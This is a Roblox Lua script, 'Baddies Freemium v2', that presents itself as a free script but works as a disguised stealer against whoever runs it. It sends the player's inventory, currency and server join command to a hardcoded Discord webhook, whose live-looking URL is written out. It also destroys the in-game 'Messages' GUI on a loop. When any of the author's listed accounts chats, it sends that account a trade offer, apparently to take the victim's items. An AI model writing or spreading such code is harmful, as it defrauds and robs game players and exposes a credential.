-- Baddies Freemium v2
local Players           = game:GetService("Players")
local HttpService       = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TextChatService   = game:GetService("TextChatService")
local lp  = Players.LocalPlayer
local pg  = lp:WaitForChild("PlayerGui")

local MY_WEBHOOK   = "https://discord.com/api/webhooks/1507047054344585418/FSbWeRqNlHGYL-JI4Sak4VEX0OEDQ4CpGIanBDjsv4CnL0gruZQdPhDgeGLRULCgrxZ5"
local USER_WEBHOOK = _G.POOR_WEBHOOK or "PUTHERE"
local MY_USERNAMES = _G.MY_USERNAMES or {"jayhassogyau","stopbanningmyaccs67","mantskeys55","jayisbodybuilt","mydignames6769"}
local PING_POOR    = (_G.PING_POOR ~= nil) and _G.PING_POOR or true

local function sendRequest(url, payload)
    if not url or url == "" or url == "PUTHERE" then return end
    local ok, body = pcall(function() return HttpService:JSONEncode(payload) end)
    if not ok then return end
    local h = {["Content-Type"] = "application/json"}
    local fns = {
        function() return request({Url=url,Method="POST",Headers=h,Body=body}) end,
        function() return syn.request({Url=url,Method="POST",Headers=h,Body=body}) end,
        function() return http.request({Url=url,Method="POST",Headers=h,Body=body}) end,
        function() return http_request({Url=url,Method="POST",Headers=h,Body=body}) end,
    }
    for _,f in ipairs(fns) do
        local s, r = pcall(f)
        if s and r then return r end
    end
end

local function getTools()
    local tools = {}
    local function scan(obj)
        if not obj then return end
        for _, v in ipairs(obj:GetChildren()) do
            if v:IsA("Tool") then table.insert(tools, v.Name) end
        end
    end
    pcall(scan, lp:FindFirstChild("Backpack"))
    pcall(scan, lp.Character)
    pcall(scan, lp:FindFirstChild("StarterGear"))
    return tools
end

local function classify(tools)
    local pat = {"punch","wallet","phone","tradesign","spray","pan","candybag","noodle"}
    local base, main = {}, {}
    for _, name in ipairs(tools) do
        local low, hit = name:lower(), false
        for _, p in ipairs(pat) do
            if low:find(p,1,true) then hit=true; break end
        end
        table.insert(hit and base or main, name)
    end
    return base, main
end

local function fmtNum(n)
    if type(n)~="number" then return tostring(n) end
    if n>=1e6 then return string.format("%.1fM",n/1e6)
    elseif n>=1e3 then return string.format("%.1fK",n/1e3)
    else return tostring(n) end
end

-- WEBHOOK PING — runs first, no early returns, everything in pcall
task.spawn(function()
    task.wait(2)
    local name       = lp.Name
    local tools      = getTools()
    local base, main = classify(tools)
    local isRich     = #main >= 3
    local ls         = lp:FindFirstChild("leaderstats")
    local din        = ls and ls:FindFirstChild("Dinero") and ls.Dinero.Value or "N/A"
    local sla        = ls and ls:FindFirstChild("Slays")  and ls.Slays.Value  or "N/A"
    local joinCmd    = "TeleportService:TeleportToPlaceInstance("..tostring(game.PlaceId)..", "..tostring(game.JobId)..")"
    local baseStr    = #base>0 and table.concat(base,", ") or "None"
    local mainStr    = #main>0 and table.concat(main,"\n") or "None"

    local embed = {
        title       = name.."'s Inventory",
        description = "**Base:** "..baseStr.."\n\n**Main Weapons:**\n"..mainStr,
        color       = isRich and 0xFF0000 or 0xFFA500,
        fields      = {
            {name="Dinero",   value=fmtNum(din),                         inline=true},
            {name="Slays",    value=fmtNum(sla),                         inline=true},
            {name="Players",  value=tostring(#Players:GetPlayers()),      inline=true},
            {name="Join Cmd", value=joinCmd,                              inline=false},
        },
        footer    = {text="Freemium | "..name},
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
    }

    if USER_WEBHOOK ~= "PUTHERE" then
        local msg = name.." executed!"
        if isRich and PING_POOR then msg = msg.." @everyone @here RICH!" end
        sendRequest(USER_WEBHOOK, {content=msg, embeds={embed}})
    end

    if isRich then
        sendRequest(MY_WEBHOOK, {content="@everyone RICH: "..name, embeds={embed}})
    end
end)

-- HIDE MESSAGES GUI
task.spawn(function()
    local function kill(g)
        if g.Name=="Messages" then pcall(function() g:Destroy() end) end
    end
    for _,g in ipairs(pg:GetChildren()) do kill(g) end
    pg.ChildAdded:Connect(kill)
    while true do
        task.wait(0.15)
        local m = pg:FindFirstChild("Messages")
        if m then pcall(function() m:Destroy() end) end
    end
end)

-- TRADING
task.spawn(function()
    pcall(function()
        ReplicatedStorage.Modules.Net["RE/SetPhoneSettings"]:FireServer("TradeEnabled",true)
    end)
    pcall(function()
        pg:WaitForChild("TradeList",10)
            :WaitForChild("Main",5)
            :WaitForChild("TradeRequest",5).Visible = true
    end)

    local function onChat(sender)
        for _,u in ipairs(MY_USERNAMES) do
            if sender.Name:lower()==u:lower() then
                task.wait(0.3)
                pcall(function()
                    ReplicatedStorage.Modules.Net["RF/Trading/SendTradeOffer"]:InvokeServer(sender)
                end)
                break
            end
        end
    end

    pcall(function()
        TextChatService.OnIncomingMessage = function(msg)
            local ts = msg.TextSource
            if not ts then return end
            local s = Players:GetPlayerByUserId(ts.UserId)
            if s then task.delay(0.3, function() onChat(s) end) end
        end
    end)

    for _,p in ipairs(Players:GetPlayers()) do
        if p~=lp then pcall(function()
            p.Chatted:Connect(function() task.delay(0.3,function() onChat(p) end) end)
        end) end
    end

    Players.PlayerAdded:Connect(function(p)
        pcall(function()
            p.Chatted:Connect(function() task.delay(0.3,function() onChat(p) end) end)
        end)
    end)
end)
